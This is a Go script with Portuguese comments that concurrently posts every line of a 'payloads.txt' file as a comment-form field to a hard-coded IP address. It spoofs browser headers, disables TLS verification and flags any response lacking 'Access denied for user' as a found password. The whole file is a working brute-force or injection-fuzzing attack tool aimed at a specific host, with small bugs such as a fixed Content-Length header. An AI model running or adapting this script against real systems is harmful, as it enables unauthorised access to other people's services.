package main

import (
	"bufio"
	"compress/gzip"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
)

const (
	targetURL     = "http://192.111.132.100/comments"
	workerCount   = 10  // Número de goroutines para processar senhas
	logInterval   = 100 // Intervalo para exibir a quantidade de requisições realizadas
	startLine     = 1 // Linha para iniciar a leitura do arquivo
)

var requestCount int32

func main() {
	// Abrir arquivo de senhas
	file, err := os.Open("payloads.txt")
	if err != nil {
		fmt.Printf("Erro ao abrir arquivo de senhas: %v\n", err)
		return
	}
	defer file.Close()

	passwords := make(chan string, workerCount)
	var wg sync.WaitGroup

	// Iniciar workers
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go worker(passwords, &wg)
	}

	// Ler e enviar senhas para o canal
	scanner := bufio.NewScanner(file)
	lineNumber := 0
	for scanner.Scan() {
		lineNumber++
		if lineNumber < startLine {
			continue // Pular até a linha de início
		}
		passwords <- scanner.Text()
	}
	close(passwords)

	// Aguardar conclusão dos workers
	wg.Wait()

	if err := scanner.Err(); err != nil {
		fmt.Printf("Erro ao ler arquivo de senhas: %v\n", err)
	}

	fmt.Println("Força bruta concluída. Senha não encontrada.")
}

func worker(passwords <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()

	// Configurar cliente HTTP para ignorar verificação SSL
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	for password := range passwords {
		// Criando dados do formulário
		formData := url.Values{
			"comment": {password},
			"submit":  {"Submit"},
		}

		// Criando requisição POST
		req, err := http.NewRequest("POST", targetURL, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("Erro ao criar requisição: %v\n", err)
			continue
		}

		// Configurando cabeçalhos da requisição
		req.Header.Set("Host", "192.111.132.100")
		req.Header.Set("Content-Length", "26")
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Upgrade-Insecure-Requests", "1")
		req.Header.Set("Origin", "http://192.111.132.100")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36")
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		req.Header.Set("Referer", "http://192.111.132.100/comments")
		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
		req.Header.Set("Accept-Language", "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,my;q=0.6")
		req.Header.Set("Connection", "keep-alive")

		// Realizando a requisição
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("Erro ao enviar requisição: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		// Incrementando o contador de requisições
		count := atomic.AddInt32(&requestCount, 1)
		if count%logInterval == 0 {
			fmt.Printf("Requisições realizadas: %d\n", count)
		}

		if resp.StatusCode == http.StatusOK {
			var body []byte
			if resp.Header.Get("Content-Encoding") == "gzip" {
				gz, err := gzip.NewReader(resp.Body)
				if err != nil {
					fmt.Printf("Erro ao ler resposta gzip: %v\n", err)
					continue
				}
				body, err = ioutil.ReadAll(gz)
				if err != nil {
					fmt.Printf("Erro ao ler corpo da resposta gzip: %v\n", err)
					continue
				}
				gz.Close()
			} else {
				body, err = ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Printf("Erro ao ler corpo da resposta: %v\n", err)
					continue
				}
			}

			// Verificando o resultado da tentativa
			if !strings.Contains(string(body), "Access denied for user") {
				fmt.Printf("Senha encontrada: %s\n", password)
			} else {
				fmt.Printf("Senha incorreta (%d): %s\n", resp.StatusCode, password)
			}
		} else {
			fmt.Printf("Resposta inesperada (%d): %s\n", resp.StatusCode, password)
		}
	}
}

